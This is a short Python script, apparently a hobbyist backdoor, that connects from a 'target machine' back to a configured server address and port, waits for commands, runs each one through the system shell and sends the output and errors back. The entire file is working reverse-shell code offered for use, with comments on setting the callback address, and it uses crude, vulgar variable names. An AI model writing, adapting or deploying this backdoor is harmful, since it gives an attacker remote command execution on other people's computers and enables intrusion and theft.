#!/usr/bin/env python3

#import socket and subprocess modules, subprocess module allows us to run commands on our target machine.
import subprocess
import socket


#don't forget to set the correct server ip address and port in order for this to callback home.
serverIp = '192.168.1.1'
serverPort = 8080
backdoor = socket.socket()
backdoor.connect((serverIp, serverPort))

while True:
    #after successfull callback to home, goatse will start to listen for commands from server
    anal = backdoor.recv(1024)
    
    #this decodes the user command from sent from server
    anal = anal.decode()
    UserInput = subprocess.Popen(anal, shell = True, stderr = subprocess.PIPE, stdout = subprocess.PIPE)
    
    #then executes command and read the output/error
    output = UserInput.stdout.read()
    output_error = UserInput.stderr.read()
    backdoor.send(output + output_error)